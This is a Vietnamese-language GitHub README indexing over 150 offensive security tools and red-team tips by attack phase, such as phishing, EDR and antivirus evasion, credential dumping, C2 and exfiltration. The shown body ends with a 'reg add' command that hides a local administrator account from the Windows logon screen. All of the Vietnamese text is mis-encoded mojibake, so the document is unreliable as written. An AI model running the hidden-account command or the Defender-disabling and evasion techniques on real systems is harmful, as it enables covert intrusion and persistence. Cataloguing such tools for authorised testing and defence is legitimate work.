# **RedTeam-Tools**
[![GitHub stars](https://img.shields.io/badge/stars-35054-blue?style=social)](https://github.com/Trongdepzai-dev/Hack-quiz2020/stargazers)
[![GitHub forks](https://img.shields.io/badge/forks-0-blue?style=social)](https://github.com/Trongdepzai-dev/Hack-quiz2020/network/members)
[![GitHub license](https://img.shields.io/github/license/Trongdepzai-dev/Hack-quiz2020)](https://github.com/Trongdepzai-dev/Hack-quiz2020/blob/main/LICENSE) 
[![Rating](https://img.shields.io/badge/rating-4.8%20stars-yellowgreen?style=social)](https://github.com/Trongdepzai-dev/Hack-quiz2020)
[![Code Quality](https://img.shields.io/badge/code%20quality-A%2B-blue?style=social)](https://github.com/Trongdepzai-dev/Hack-quiz2020)
[![Version](https://img.shields.io/badge/version-1.0.0-blue?style=social)](https://github.com/Trongdepzai-dev/Hack-quiz2020/releases/tag/v1.0.0)
[![Activity Level](https://img.shields.io/badge/activity%20level-high-brightgreen?style=social)](https://github.com/Trongdepzai-dev/Hack-quiz2020)
<p align="center">
<img src="https://user-images.githubusercontent.com/100603074/210680426-20a92131-56f9-43ad-be82-f449e3215dda.png" height="300">
</p>

Kho lÆ°u trá»¯ Github nÃ y chá»©a má»™t bá»™ sÆ°u táº­p hÆ¡n **150+** **cÃ´ng cá»¥** vÃ  **nguá»“n tÃ i nguyÃªn** há»¯u Ã­ch cho cÃ¡c **hoáº¡t Ä‘á»™ng red teaming**.

Má»™t sá»‘ **cÃ´ng cá»¥** cÃ³ thá»ƒ Ä‘Æ°á»£c thiáº¿t káº¿ riÃªng cho **red teaming**, trong khi nhá»¯ng **cÃ´ng cá»¥** khÃ¡c cÃ³ tÃ­nh cháº¥t tá»•ng quÃ¡t hÆ¡n vÃ  cÃ³ thá»ƒ Ä‘Æ°á»£c Ä‘iá»u chá»‰nh Ä‘á»ƒ sá»­ dá»¥ng cho **red teaming**.

> ğŸ”— Náº¿u báº¡n lÃ  Blue Teamer, hÃ£y xem bÃ i viáº¿t vá» [**BlueTeam-Tools**](https://github.com/Trongdepzai-dev/BlueTeam-Tools-VietNamese)

> **Cáº£nh bÃ¡o**
> 
> *ÄÃ¢y lÃ  1 báº£n port **Viá»‡t HoÃ¡** vÃ  thÃªm 1 sá»‘ **lÆ°u Ã½** tá»« dá»± Ã¡n [**BlueTeam-Tools**](https://github.com/A-poc/BlueTeam-Tools) vÃ  [**RedTeam-Tools**](https://github.com/A-poc/RedTeam-Tools)*
> 
> *CÃ¡c tÃ i liá»‡u trong kho lÆ°u trá»¯ nÃ y chá»‰ dÃ nh cho má»¥c Ä‘Ã­ch thÃ´ng tin vÃ  giÃ¡o dá»¥c. ChÃºng khÃ´ng nháº±m má»¥c Ä‘Ã­ch sá»­ dá»¥ng trong báº¥t ká»³ hoáº¡t Ä‘á»™ng báº¥t há»£p phÃ¡p nÃ o.*

> **Ghi chÃº**
>
> *áº¨n cÃ¡c tiÃªu Ä‘á» cá»§a **Danh sÃ¡ch cÃ´ng cá»¥** báº±ng mÅ©i tÃªn.*
>
> *Nháº¥n ğŸ”™ Ä‘á»ƒ quay láº¡i danh sÃ¡ch. CÃ³ thá»ƒ 1 sá»‘ cÃ¡i khÃ´ng hoáº¡t Ä‘á»™ng nhÆ° mong muá»‘n* =))
>
> *BÃ i viáº¿t nÃ y sá»­ dá»¥ng **MIT License***
>
> Xin chÃ¢n thÃ nh cáº£m Æ¡n nhá»¯ng ngÆ°á»i Ä‘Ã£ Ä‘Ã³ng gÃ³p cho dá»± Ã¡n nÃ y:
>
> @[Junior-Frontend-dev](https://github.com/Junior-Frontend-dev)

# **Danh sÃ¡ch cÃ´ng cá»¥**

<details open>
<summary>**Máº¹o Red Team** 19 máº¹o</summary>
    <ul>
        <ul>
        	<li>**<a href="#improved-html-smuggling-with-mouse-move-eventlistener">Cáº£i tiáº¿n **HTML smuggling** báº±ng **EventListener** sá»± kiá»‡n di chuyá»ƒn chuá»™t</a>**<i> @pr0xylife</i></li>
        	<li>**<a href="#google-translate-for-phishing">Google translate cho **phishing**</a>**<i> @malmoeb</i></li>
            <li>**<a href="#hiding-the-local-admin-account">áº¨n tÃ i khoáº£n admin cá»¥c bá»™</a>**<i> @Alh4zr3d</i></li>
            <li>**<a href="#cripple-windows-defender-by-deleting-signatures">LÃ m tÃª liá»‡t **Windows Defender** báº±ng cÃ¡ch xÃ³a chá»¯ kÃ½</a>**<i> @Alh4zr3d</i></li>
            <li>**<a href="#enable-multiple-rdp-sessions-per-user">Cho phÃ©p nhiá»u phiÃªn **RDP** cho má»—i ngÆ°á»i dÃ¹ng</a>**<i> @Alh4zr3d</i></li>
            <li>**<a href="#sysinternals-psexecexe-local-alternative">Giáº£i phÃ¡p thay tháº¿ cá»¥c bá»™ cho **Sysinternals PsExec.exe**</a>**<i> @GuhnooPlusLinux</i></li>
            <li>**<a href="#live-off-the-land-port-scanner">MÃ¡y quÃ©t cá»•ng "**Live off the land**"</a>**<i> @Alh4zr3d</i></li>
            <li>**<a href="#proxy-aware-powershell-downloadstring">PowerShell DownloadString cÃ³ há»— trá»£ proxy</a>**<i> @Alh4zr3d</i></li>
            <li>**<a href="#looking-for-internal-endpoints-in-browser-bookmarks">TÃ¬m kiáº¿m cÃ¡c **endpoint ná»™i bá»™** trong dáº¥u trang trÃ¬nh duyá»‡t</a>**<i> @Alh4zr3d</i></li>
            <li>**<a href="#query-dns-records-for-enumeration">Truy váº¥n báº£n ghi **DNS** Ä‘á»ƒ liá»‡t kÃª</a>**<i> @Alh4zr3d</i></li>
            <li>**<a href="#unquoted-service-paths-without-powerup">TÃ¬m Ä‘Æ°á»ng dáº«n dá»‹ch vá»¥ khÃ´ng cÃ³ dáº¥u ngoáº·c kÃ©p mÃ  khÃ´ng cáº§n **PowerUp**</a>**<i> @Alh4zr3d</i></li>
            <li>**<a href="#bypass-a-disabled-command-prompt-with-k">Bypass dáº¥u nháº¯c lá»‡nh bá»‹ táº¯t vá»›i **/k**</a>**<i> Martin Sohn Christensen</i></li>
            <li>**<a href="#stop-windows-defender-deleting-mimikatzexe">NgÄƒn **Windows Defender** xÃ³a **mimikatz.exe**</a>**<i> @GuhnooPlusLinux</i></li>
            <li>**<a href="#check-if-you-are-in-a-virtual-machine">Kiá»ƒm tra xem báº¡n cÃ³ Ä‘ang á»Ÿ trong **mÃ¡y áº£o** khÃ´ng</a>**<i> @dmcxblue</i></li>
            <li>**<a href="#enumerate-applocker-rules">Liá»‡t kÃª quy táº¯c **AppLocker**</a>**<i> @Alh4zr3d</i></li>
            <li>**<a href="#cmd-shortcut-with-6-pixels-via-mspaint">Lá»‘i táº¯t **CMD** vá»›i 6 pixel qua **mspaint**</a>**<i> PenTestPartners</i></li>
            <li>**<a href="#link-spoofing-with-preventdefault-javascript-method">Giáº£ máº¡o liÃªn káº¿t vá»›i phÆ°Æ¡ng thá»©c JavaScript **PreventDefault**</a>**<i> </i></li>
            <li>**<a href="#check-smb-firewall-rules-with-responder">Kiá»ƒm tra quy táº¯c **firewall SMB** vá»›i **Responder**</a>**<i> @malmoeb</i></li>
            <li>**<a href="#disable-av-with-sysinternals-pssuspend">VÃ´ hiá»‡u hÃ³a AV vá»›i **SysInternals PsSuspend**</a>**<i> @0gtweet</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Reconnaissance** 24 cÃ´ng cá»¥</summary>
    <ul>
        <ul>
            <li>**<a href="#spiderfoot">spiderfoot</a>**<i> Ãnh xáº¡ **OSINT** vÃ  bá» máº·t táº¥n cÃ´ng tá»± Ä‘á»™ng</i></li>
            <li>**<a href="#reconftw">reconftw</a>**<i> CÃ´ng cá»¥ **recon** tÃªn miá»n phá»¥ vÃ  lá»— há»•ng tá»± Ä‘á»™ng</i></li>
            <li>**<a href="#subzy">subzy</a>**<i> TrÃ¬nh kiá»ƒm tra lá»— há»•ng chiáº¿m quyá»n Ä‘iá»u khiá»ƒn tÃªn miá»n phá»¥</i></li>
            <li>**<a href="#smtp-user-enum">smtp-user-enum</a>**<i> Liá»‡t kÃª ngÆ°á»i dÃ¹ng **SMTP**</i></li>
            <li>**<a href="#crtsh---httprobe---eyewitness">crt.sh -> httprobe -> EyeWitness</a>**<i> Chá»¥p áº£nh mÃ n hÃ¬nh tÃªn miá»n tá»± Ä‘á»™ng</i></li>
            <li>**<a href="#jsendpoints">jsendpoints</a>**<i> TrÃ­ch xuáº¥t cÃ¡c liÃªn káº¿t **DOM** trang</i></li>
            <li>**<a href="#nuclei">nuclei</a>**<i> TrÃ¬nh quÃ©t lá»— há»•ng</i></li>
            <li>**<a href="#certsniff">certSniff</a>**<i> Bá»™ **sniff** tá»« khÃ³a nháº­t kÃ½ minh báº¡ch chá»©ng chá»‰</i></li>
            <li>**<a href="#gobuster">gobuster</a>**<i> **Brute force** Ä‘Æ°á»ng dáº«n trang web</i></li>
            <li>**<a href="#feroxbuster">feroxbuster</a>**<i> CÃ´ng cá»¥ khÃ¡m phÃ¡ ná»™i dung nhanh Ä‘Æ°á»£c viáº¿t báº±ng Rust</i></li>
            <li>**<a href="#cloudbrute">CloudBrute</a>**<i> **Brute force** háº¡ táº§ng **cloud**</i></li>
            <li>**<a href="#dnsrecon">dnsrecon</a>**<i> Liá»‡t kÃª báº£n ghi **DNS**</i></li>
            <li>**<a href="#shodanio">Shodan.io</a>**<i> CÆ¡ sá»Ÿ kiáº¿n thá»©c há»‡ thá»‘ng hÆ°á»›ng ra cÃ´ng cá»™ng</i></li>
            <li>**<a href="#aort">AORT (All in One Recon Tool)</a>**<i> Liá»‡t kÃª tÃªn miá»n phá»¥</i></li>
            <li>**<a href="#spoofcheck">spoofcheck</a>**<i> TrÃ¬nh kiá»ƒm tra báº£n ghi **SPF/DMARC**</i></li>
            <li>**<a href="#awsbucketdump">AWSBucketDump</a>**<i> Liá»‡t kÃª S3 bucket</i></li>
            <li>**<a href="#githarvester">GitHarvester</a>**<i> CÃ´ng cá»¥ tÃ¬m kiáº¿m thÃ´ng tin xÃ¡c thá»±c **GitHub**</i></li>
            <li>**<a href="#trufflehog">truffleHog</a>**<i> TrÃ¬nh quÃ©t thÃ´ng tin xÃ¡c thá»±c **GitHub**</i></li>
            <li>**<a href="#dismap">Dismap</a>**<i> KhÃ¡m phÃ¡/nháº­n dáº¡ng tÃ i sáº£n</i></li>
            <li>**<a href="#enum4linux">enum4linux</a>**<i> Liá»‡t kÃª **Windows/samba**</i></li>
            <li>**<a href="#skanuvaty">skanuvaty</a>**<i> TrÃ¬nh quÃ©t **dns/network/port** cá»±c nhanh vÃ  nguy hiá»ƒm</i></li>
            <li>**<a href="#metabigor">Metabigor</a>**<i> CÃ´ng cá»¥ **OSINT** khÃ´ng cáº§n **API**</i></li>
            <li>**<a href="#gitrob">Gitrob</a>**<i> TrÃ¬nh quÃ©t thÃ´ng tin nháº¡y cáº£m **GitHub**</i></li>
            <li>**<a href="#gowitness">gowitness</a>**<i> Tiá»‡n Ã­ch chá»¥p áº£nh mÃ n hÃ¬nh web sá»­ dá»¥ng **Chrome Headless**</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Resource Development** 12 cÃ´ng cá»¥</summary>
    <ul>
        <ul>
            <li>**<a href="#remoteinjector">remoteinjector</a>**<i> TiÃªm liÃªn káº¿t máº«u tá»« xa vÃ o tÃ i liá»‡u word</i></li>
            <li>**<a href="#chimera">Chimera</a>**<i> Che giáº¥u **PowerShell**</i></li>
            <li>**<a href="#msfvenom">msfvenom</a>**<i> Táº¡o **payload**</i></li>
            <li>**<a href="#shellter">Shellter</a>**<i> CÃ´ng cá»¥ tiÃªm **shellcode** Ä‘á»™ng</i></li>
            <li>**<a href="#freeze">Freeze</a>**<i> Táº¡o **payload** (**nÃ© trÃ¡nh EDR**)</i></li>
            <li>**<a href="#wordsteal">WordSteal</a>**<i> ÄÃ¡nh cáº¯p hash **NTML** vá»›i **Microsoft Word**</i></li>
            <li>**<a href="#ntapi-undocumented-functions">HÃ m **NTAPI** chÆ°a Ä‘Æ°á»£c tÃ i liá»‡u hÃ³a</a>**<i> **Windows NT Kernel, Native API** vÃ  **drivers**</i></li>
            <li>**<a href="#kernel-callback-functions">HÃ m **Kernel Callback Functions**</a>**<i> CÃ¡c **API Windows** chÆ°a Ä‘Æ°á»£c tÃ i liá»‡u hÃ³a</i></li>
            <li>**<a href="#offensivevba">OffensiveVBA</a>**<i> Ká»¹ thuáº­t thá»±c thi mÃ£ **Office macro** vÃ  nÃ© trÃ¡nh</i></li>
            <li>**<a href="#wsh">WSH</a>**<i> **Payload Wsh**</i></li>
            <li>**<a href="#hta">HTA</a>**<i> **Payload Hta**</i></li>
            <li>**<a href="#vba">VBA</a>**<i> **Payload Vba**</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Initial Access** 10 cÃ´ng cá»¥</summary>
    <ul>
        <ul>
            <li>**<a href="#credmaster">CredMaster</a>**<i> CÃ´ng cá»¥ **password spraying** **CredKing**</i></li>
            <li>**<a href="#trevorspray">TREVORspray</a>**<i> TrÃ¬nh phun máº­t kháº©u cÃ³ há»— trá»£ luá»“ng (**threading**)</i></li>
            <li>**<a href="#evilqr">evilqr</a>**<i> **PoC phishing QRLJacking**</i></li>
            <li>**<a href="#cupp">CUPP</a>**<i> CÃ´ng cá»¥ táº¡o profile máº­t kháº©u ngÆ°á»i dÃ¹ng phá»• biáº¿n (**Common User Passwords Profiler - CUPP**)</i></li>
            <li>**<a href="#bash-bunny">Bash Bunny</a>**<i> CÃ´ng cá»¥ táº¥n cÃ´ng **USB**</i></li>
            <li>**<a href="#evilgophish">EvilGoPhish</a>**<i> **Framework** chiáº¿n dá»‹ch **phishing**</i></li>
            <li>**<a href="#social-engineer-toolkit-set">The Social-Engineer Toolkit</a>**<i> **Framework** chiáº¿n dá»‹ch **phishing**</i></li>
            <li>**<a href="#hydra">Hydra</a>**<i> CÃ´ng cá»¥ **brute force**</i></li>
            <li>**<a href="#squarephish">SquarePhish</a>**<i> **Framework phishing OAuth/QR code**</i></li>
            <li>**<a href="#king-phisher">King Phisher</a>**<i> **Framework** chiáº¿n dá»‹ch **phishing**</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Execution** 13 cÃ´ng cá»¥</summary>
    <ul>
        <ul>
            <li>**<a href="#responder">Responder</a>**<i> **LLMNR, NBT-NS** vÃ  trÃ¬nh Ä‘á»™c **MDNS**</i></li>
            <li>**<a href="#secretsdump">secretsdump</a>**<i> TrÃ¬nh **dump** hash tá»« xa</i></li>
            <li>**<a href="#evil-winrm">evil-winrm</a>**<i> Shell **WinRM**</i></li>
            <li>**<a href="#donut">Donut</a>**<i> Thá»±c thi .NET trong bá»™ nhá»›</i></li>
            <li>**<a href="#macro_pack">Macro_pack</a>**<i> Che giáº¥u Macro</i></li>
            <li>**<a href="#powersploit">PowerSploit</a>**<i> Bá»™ script **PowerShell**</i></li>
            <li>**<a href="#rubeus">Rubeus</a>**<i> CÃ´ng cá»¥ táº¥n cÃ´ng **Active Directory**</i></li>
            <li>**<a href="#sharpup">SharpUp</a>**<i> TrÃ¬nh nháº­n dáº¡ng lá»— há»•ng **Windows**</i></li>
            <li>**<a href="#sqlrecon">SQLRecon</a>**<i> **Toolkit MS-SQL** táº¥n cÃ´ng</i></li>
            <li>**<a href="#ultimateapplockerbypasslist">UltimateAppLockerByPassList</a>**<i> Ká»¹ thuáº­t **Bypass AppLocker** phá»• biáº¿n</i></li>
            <li>**<a href="#starfighters">StarFighters</a>**<i> TrÃ¬nh khá»Ÿi cháº¡y **Empire** dá»±a trÃªn **JavaScript** vÃ  **VBScript**</i></li>
            <li>**<a href="#demiguise">demiguise</a>**<i> CÃ´ng cá»¥ mÃ£ hÃ³a **HTA**</i></li>
            <li>**<a href="#powerzure">PowerZure</a>**<i> **Framework PowerShell** Ä‘á»ƒ Ä‘Ã¡nh giÃ¡ báº£o máº­t **Azure**</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Persistence** 4 cÃ´ng cá»¥</summary>
    <ul>
        <ul>
            <li>**<a href="#impacket">Impacket</a>**<i> Bá»™ script **Python**</i></li>
            <li>**<a href="#empire">Empire</a>**<i> **Framework** háº­u khai thÃ¡c (**post-exploitation**)</i></li>
            <li>**<a href="#sharpersist">SharPersist</a>**<i> Toolkit duy trÃ¬ truy cáº­p **Windows**</i></li>
            <li>**<a href="#ligolo-ng">ligolo-ng</a>**<i> CÃ´ng cá»¥ táº¡o tunnel sá»­ dá»¥ng giao diá»‡n TUN</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Privilege Escalation** 11 cÃ´ng cá»¥</summary>
    <ul>
        <ul>
            <li>**<a href="#crassus">Crassus</a>**<i> CÃ´ng cá»¥ khÃ¡m phÃ¡ nÃ¢ng quyá»n cá»¥c bá»™ **Windows**</i></li>
            <li>**<a href="#linpeas">LinPEAS</a>**<i> NÃ¢ng quyá»n cá»¥c bá»™ **Linux**</i></li>
            <li>**<a href="#winpeas">WinPEAS</a>**<i> NÃ¢ng quyá»n cá»¥c bá»™ **Windows**</i></li>
            <li>**<a href="#linux-smart-enumeration">linux-smart-enumeration</a>**<i> NÃ¢ng quyá»n cá»¥c bá»™ **Linux**</i></li>
            <li>**<a href="#certify">Certify</a>**<i> NÃ¢ng quyá»n cá»¥c bá»™ **Active Directory**</i></li>
            <li>**<a href="#get-gpppassword">Get-GPPPassword</a>**<i> TrÃ­ch xuáº¥t máº­t kháº©u **Windows**</i></li>
            <li>**<a href="#sherlock">Sherlock</a>**<i> CÃ´ng cá»¥ nÃ¢ng quyá»n cá»¥c bá»™ **PowerShell**</i></li>
            <li>**<a href="#watson">Watson</a>**<i> CÃ´ng cá»¥ nÃ¢ng quyá»n cá»¥c bá»™ **Windows**</i></li>
            <li>**<a href="#impulsivedllhijack">ImpulsiveDLLHijack</a>**<i> CÃ´ng cá»¥ **DLL Hijack**</i></li>
            <li>**<a href="#adfsdump">ADFSDump</a>**<i> CÃ´ng cá»¥ **dump AD FS**</i></li>
            <li>**<a href="#beroot">BeRoot</a>**<i> Dá»± Ã¡n nÃ¢ng quyá»n cá»¥c bá»™ trÃªn nhiá»u **HÄH**</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Defense Evasion** 8 cÃ´ng cá»¥</summary>
    <ul>
        <ul>
            <li>**<a href="#invoke-obfuscation">Invoke-Obfuscation</a>**<i> CÃ´ng cá»¥ che giáº¥u script</i></li>
            <li>**<a href="#veil">Veil</a>**<i> CÃ´ng cá»¥ che giáº¥u **Metasploit payload**</i></li>
            <li>**<a href="#sharpblock">SharpBlock</a>**<i> **Bypass EDR** thÃ´ng qua ngÄƒn cháº·n thá»±c thi Ä‘iá»ƒm vÃ o</i></li>
            <li>**<a href="#alcatraz">Alcatraz</a>**<i> TrÃ¬nh che giáº¥u nhá»‹ phÃ¢n x64 cÃ³ **GUI**</i></li>
            <li>**<a href="#mangle">Mangle</a>**<i> Thao tÃ¡c vá»›i cÃ¡c tá»‡p thá»±c thi Ä‘Ã£ biÃªn dá»‹ch</i></li>
            <li>**<a href="#amsi-fail">AMSI Fail</a>**<i> CÃ¡c Ä‘oáº¡n code **PowerShell** lÃ m há»ng hoáº·c vÃ´ hiá»‡u hÃ³a **AMSI**</i></li>
            <li>**<a href="#scarecrow">ScareCrow</a>**<i> **Framework** táº¡o **payload** Ä‘Æ°á»£c thiáº¿t káº¿ Ä‘á»ƒ **bypass EDR**</i></li>
            <li>**<a href="#moonwalk">moonwalk</a>**<i> CÃ´ng cá»¥ xÃ³a dáº¥u thá»i gian nháº­t kÃ½ há»‡ thá»‘ng vÃ  há»‡ thá»‘ng tá»‡p **Linux**</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Credential Access** 11 cÃ´ng cá»¥</summary>
    <ul>
        <ul>
            <li>**<a href="#mimikatz">Mimikatz</a>**<i> TrÃ¬nh trÃ­ch xuáº¥t thÃ´ng tin xÃ¡c thá»±c **Windows**</i></li>
            <li>**<a href="#lazagne">LaZagne</a>**<i> TrÃ¬nh trÃ­ch xuáº¥t máº­t kháº©u cá»¥c bá»™</i></li>
            <li>**<a href="#hashcat">hashcat</a>**<i> Cracking **password hash**</i></li>
            <li>**<a href="#john-the-ripper">John the Ripper</a>**<i> Cracking **password hash**</i></li>
            <li>**<a href="#scomdecrypt">SCOMDecrypt</a>**<i> CÃ´ng cá»¥ giáº£i mÃ£ thÃ´ng tin xÃ¡c thá»±c **SCOM**</i></li>
            <li>**<a href="#nanodump">nanodump</a>**<i> Táº¡o **minidump** tiáº¿n trÃ¬nh **LSASS**</i></li>
            <li>**<a href="#eviltree">eviltree</a>**<i> Báº£n dá»±ng láº¡i lá»‡nh **Tree** Ä‘á»ƒ khÃ¡m phÃ¡ thÃ´ng tin xÃ¡c thá»±c</i></li>
            <li>**<a href="#seeyoucm-thief">SeeYouCM-Thief</a>**<i> PhÃ¢n tÃ­ch cÃº phÃ¡p tá»‡p cáº¥u hÃ¬nh há»‡ thá»‘ng Ä‘iá»‡n thoáº¡i **Cisco**</i></li>
            <li>**<a href="#mailsniper">MailSniper</a>**<i> TrÃ¬nh tÃ¬m kiáº¿m thÆ° **Microsoft Exchange**</i></li>
            <li>**<a href="#sharpchromium">SharpChromium</a>**<i> TrÃ¬nh trÃ­ch xuáº¥t **Cookie, history** vÃ  thÃ´ng tin Ä‘Äƒng nháº­p Ä‘Ã£ lÆ°u cá»§a **Chromium**</i></li>
            <li>**<a href="#dploot">dploot</a>**<i> Loooter **DPAPI** tá»« xa báº±ng **Python**</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Discovery** 6 cÃ´ng cá»¥</summary>
    <ul>
        <ul>
            <li>**<a href="#pcredz">PCredz</a>**<i> KhÃ¡m phÃ¡ thÃ´ng tin xÃ¡c thá»±c trÃªn file **PCAP/live interface**</i></li>
            <li>**<a href="#pingcastle">PingCastle</a>**<i> TrÃ¬nh Ä‘Ã¡nh giÃ¡ **Active Directory**</i></li>
            <li>**<a href="#seatbelt">Seatbelt</a>**<i> TrÃ¬nh quÃ©t lá»— há»•ng cá»¥c bá»™</i></li>
            <li>**<a href="#adrecon">ADRecon</a>**<i> **Reconnaissance Active Directory**</i></li>
            <li>**<a href="#adidnsdump">adidnsdump</a>**<i> **Dumping DNS** tÃ­ch há»£p **Active Directory**</i></li>
            <li>**<a href="#scavenger">scavenger</a>**<i> CÃ´ng cá»¥ quÃ©t Ä‘á»ƒ tÃ¬m kiáº¿m (**scavenging**) cÃ¡c há»‡ thá»‘ng</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Lateral Movement** 12 cÃ´ng cá»¥</summary>
    <ul>
        <ul>
            <li>**<a href="#crackmapexec">crackmapexec</a>**<i> Toolkit di chuyá»ƒn ngang trÃªn **Windows/Active Directory**</i></li>
            <li>**<a href="#wmiops">WMIOps</a>**<i> Lá»‡nh **WMI** tá»« xa</i></li>
            <li>**<a href="#powerlessshell">PowerLessShell</a>**<i> **PowerShell** tá»« xa mÃ  khÃ´ng cáº§n **PowerShell.exe**</i></li>
            <li>**<a href="#psexec">PsExec</a>**<i> CÃ´ng cá»¥ thay tháº¿ telnet gá»n nháº¹</i></li>
            <li>**<a href="#liquidsnake">LiquidSnake</a>**<i> Di chuyá»ƒn ngang khÃ´ng ghi vÃ o Ä‘Ä©a</i></li>
            <li>**<a href="#enabling-rdp">Báº­t **RDP**</a>**<i> Lá»‡nh báº­t **RDP Windows**</i></li>
            <li>**<a href="#upgrading-shell-to-meterpreter">NÃ¢ng cáº¥p shell lÃªn **meterpreter**</a>**<i> Cáº£i tiáº¿n reverse shell</i></li>
            <li>**<a href="#forwarding-ports">Chuyá»ƒn tiáº¿p cá»•ng</a>**<i> Lá»‡nh chuyá»ƒn tiáº¿p cá»•ng cá»¥c bá»™</i></li>
            <li>**<a href="#jenkins-reverse-shell">Reverse shell Jenkins</a>**<i> Lá»‡nh shell **Jenkins**</i></li>
            <li>**<a href="#adfspoof">ADFSpoof</a>**<i> Táº¡o giáº£ **token** báº£o máº­t **AD FS**</i></li>
            <li>**<a href="#kerbrute">kerbrute</a>**<i> CÃ´ng cá»¥ thá»±c hiá»‡n **Kerberos pre-auth bruteforcing**</i></li>
            <li>**<a href="#coercer">Coercer</a>**<i> Buá»™c mÃ¡y chá»§ **Windows** xÃ¡c thá»±c</i></li>
            <li>**<a href="#wmiops">WMIOps</a>**<i> Lá»‡nh **WMI** tá»« xa</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Collection** 3 cÃ´ng cá»¥</summary>
    <ul>
        <ul>
            <li>**<a href="#bloodhound">BloodHound</a>**<i> Trá»±c quan hÃ³a **Active Directory**</i></li>
            <li>**<a href="#snaffler">Snaffler</a>**<i> Thu tháº­p thÃ´ng tin xÃ¡c thá»±c **Active Directory**</i></li>
            <li>**<a href="#linwinpwn">linWinPwn</a>**<i> Kiá»ƒm tra liá»‡t kÃª vÃ  lá»— há»•ng **Active Directory**</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Command and Control** 9 cÃ´ng cá»¥</summary>
    <ul>
        <ul>
            <li>**<a href="#living-off-trusted-sites-project">Dá»± Ã¡n "**Living Off Trusted Sites Project**"</a>**<i> Táº­n dá»¥ng cÃ¡c tÃªn miá»n há»£p phÃ¡p cho **C2** cá»§a báº¡n</i></li>
            <li>**<a href="#havoc">Havoc</a>**<i> **Framework Command and control**</i></li>
            <li>**<a href="#covenant">Covenant</a>**<i> **Framework Command and control** (.NET)</i></li>
            <li>**<a href="#merlin">Merlin</a>**<i> **Framework Command and control** (Golang)</i></li>
            <li>**<a href="#metasploit-framework">Metasploit Framework</a>**<i> **Framework Command and control** (Ruby)</i></li>
            <li>**<a href="#pupy">Pupy</a>**<i> **Framework Command and control** (Python)</i></li>
            <li>**<a href="#brute-ratel">Brute Ratel</a>**<i> **Framework Command and control** ($$$)</i></li>
            <li>**<a href="#nimplant">NimPlant</a>**<i> **Implant C2** Ä‘Æ°á»£c viáº¿t báº±ng Nim</i></li>
            <li>**<a href="#hoaxshell">Hoaxshell</a>**<i> **PowerShell reverse shell**</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Exfiltration** 5 cÃ´ng cá»¥</summary>
    <ul>
        <ul>
            <li>**<a href="#dnscat2">Dnscat2</a>**<i> C2 qua **DNS tunneling**</i></li>
            <li>**<a href="#cloakify">Cloakify</a>**<i> Chuyá»ƒn Ä‘á»•i dá»¯ liá»‡u Ä‘á»ƒ **exfiltration**</i></li>
            <li>**<a href="#pyexfil">PyExfil</a>**<i> **PoC Data exfiltration**</i></li>
            <li>**<a href="#powershell-rat">Powershell RAT</a>**<i> **Backdoor** dá»±a trÃªn **Python**</i></li>
            <li>**<a href="#gd-thief">GD-Thief</a>**<i> **Exfiltration Google Drive**</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Impact** 4 cÃ´ng cá»¥</summary>
    <ul>
        <ul>
            <li>**<a href="#conti-pentester-guide-leak">RÃ² rá»‰ hÆ°á»›ng dáº«n pentester cá»§a **Conti**</a>**<i> Toolkit cá»§a cÃ¡c chi nhÃ¡nh nhÃ³m **ransomware Conti**</i></li>
            <li>**<a href="#slowloris">SlowLoris</a>**<i> Tá»« chá»‘i dá»‹ch vá»¥ Ä‘Æ¡n giáº£n (**Simple denial of service**)</i></li>
            <li>**<a href="#usbkill">usbkill</a>**<i> **Kill-switch chá»‘ng phÃ¡p y**</i></li>
            <li>**<a href="#keytap">Keytap</a>**<i> Láº¥y cÃ¡c phÃ­m bÃ n phÃ­m Ä‘Ã£ nháº¥n tá»« Ã¢m thanh gÃµ phÃ­m</i></li>
        </ul>
    </ul>
</details>

**Máº¹o Red Team**
====================

*Há»c há»i tá»« cÃ¡c **Red Teamer** vá»›i bá»™ sÆ°u táº­p Máº¹o **Red Teaming**. Nhá»¯ng máº¹o nÃ y bao gá»“m nhiá»u chiáº¿n thuáº­t, **cÃ´ng cá»¥** vÃ  phÆ°Æ¡ng phÃ¡p luáº­n Ä‘á»ƒ cáº£i thiá»‡n kháº£ nÄƒng **red teaming** cá»§a báº¡n.*

### [ğŸ”™](#tool-list)**Cáº£i tiáº¿n HTML smuggling** báº±ng **EventListener** sá»± kiá»‡n di chuyá»ƒn chuá»™t

**MÃ´ táº£:** *'**Qakbot** Ä‘Ã£ thÃªm má»™t **EventListener** cho chuyá»ƒn Ä‘á»™ng chuá»™t vÃ o tá»‡p Ä‘Ã­nh kÃ¨m **HTML smuggling** Ä‘á»ƒ chá»‘ng **evasion** trong **sandbox**, khiáº¿n tá»‡p zip khÃ´ng Ä‘Æ°á»£c tháº£ ra.'*

**ÄÃ³ng gÃ³p:** [@pr0xylife](https://x.com/pr0xylife)

**LiÃªn káº¿t:** [Twitter](https://x.com/pr0xylife/status/1598410732516802563)

### [ğŸ”™](#tool-list)Google translate cho **phishing**

**MÃ´ táº£:** *ÄÃ¡nh cáº¯p thÃ´ng tin xÃ¡c thá»±c trang web **phishing** thÃ nh cÃ´ng thÃ´ng qua chá»©c nÄƒng xem trang cá»§a **Google Translate**.*

**ÄÃ³ng gÃ³p:** [@malmoeb](https://x.com/malmoeb)

**LiÃªn káº¿t:** [Twitter](https://x.com/malmoeb/status/1671106885590630400)

### [ğŸ”™](#tool-list)áº¨n tÃ i khoáº£n admin cá»¥c bá»™

```bash
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /v alh4zr3d /d 0 /f
```
